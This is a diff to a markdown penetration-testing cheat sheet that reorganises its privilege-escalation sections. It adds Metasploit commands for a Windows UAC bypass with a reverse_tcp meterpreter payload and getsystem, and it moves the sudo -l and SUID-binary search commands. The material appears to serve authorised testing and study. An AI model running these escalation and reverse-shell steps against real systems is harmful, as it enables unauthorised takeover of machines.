@@ -761,6 +761,7 @@ i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
 - Privilege Escalation
   - [SUDO Privileges](#SUDO-Privileges)
   - [SUID Binaries](#SUID-Binaries)
+  - [Token Impersonation](#Token-Impersonation)
   - [UAC Bypass](#UAC-Bypass)
 - Maintaining Persistent Access
   - Windows
@@ -886,13 +887,37 @@ meterpreter > getsystem
 ```
 - https://docs.rapid7.com/metasploit/meterpreter-getsystem/
 
-### UAC Bypass
+### SUDO Privileges
+[<< Index](#Index)
+```
+sudo -l
+```
+- https://gtfobins.github.io/
+
+### SUID Binaries
+[<< Index](#Index)
+```
+find / -user root -perm -4000 -exec ls -ldb {} \;
+```
+- https://gtfobins.github.io/
+
+### Token Impersonation
 [<< Index](#Index)
 
+### UAC Bypass
+[<< Index](#Index)
+```
+use exploit/windows/local/bypassuac_injection
+set windows/x64/meterpreter/reverse_tcp
+set SESSION <session_id>
+set LPORT <port>
+set TARGET WINDOWS\ x64
 
-
-
-
+meterpreter > getsystem
+```
+- Need to have a 64-bit meterpreter session (session_1).
+- Change `LPORT` to avoid conflict with existing session(s).
+- In session_2, `getsystem` works because UAC flag is no longer set.
 
 
 
@@ -1096,18 +1121,6 @@ set payload windows/meterpreter/bind_tcp
 ```
 meterpreter > upload /root/tools/static-binaries/nmap /tmp/nmap
 ```
-
-## SUDO Privileges
-```
-sudo -l
-```
-- https://gtfobins.github.io/
-
-## SUID Binaries
-```
-find / -user root -perm -4000 -exec ls -ldb {} \;
-```
-- https://gtfobins.github.io/
 
 ## Transfer Files
 - Set Up A Web Server With Python
